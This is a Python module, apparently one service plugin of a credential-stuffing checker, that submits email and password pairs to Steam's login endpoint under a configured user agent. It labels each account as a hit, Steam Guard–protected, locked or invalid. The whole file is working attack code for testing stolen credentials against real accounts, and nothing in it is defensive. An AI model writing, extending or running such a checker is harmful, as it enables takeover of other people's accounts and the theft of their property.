# language: Python 3.11 — services/steam.py
import aiohttp

from .base import BaseService, CheckResult, Status
from config import USER_AGENT


class SteamService(BaseService):
    name = "steam"

    async def check(self, session: aiohttp.ClientSession, email: str, pw: str) -> CheckResult:
        try:
            async with session.post(
                "https://steamcommunity.com/login/dologin",
                data={"username": email, "password": pw, "twofactorcode": "", "remember_login": "true"},
                headers={"User-Agent": USER_AGENT},
                allow_redirects=True,
            ) as r:
                j = await r.json(content_type=None)

            if not isinstance(j, dict):
                return CheckResult(self.name, email, Status.ERROR, "bad json")

            if j.get("success"):
                return CheckResult(self.name, email, Status.HIT, "steam ok")
            if j.get("requires_twofactor"):
                return CheckResult(self.name, email, Status.TWOFA, "steam guard")
            if j.get("needs_verification"):
                return CheckResult(self.name, email, Status.LOCKED, "email verify")
            return CheckResult(self.name, email, Status.INVALID, str(j.get("message", ""))[:120])
        except Exception as e:
            return CheckResult(self.name, email, Status.ERROR, str(e)[:120])
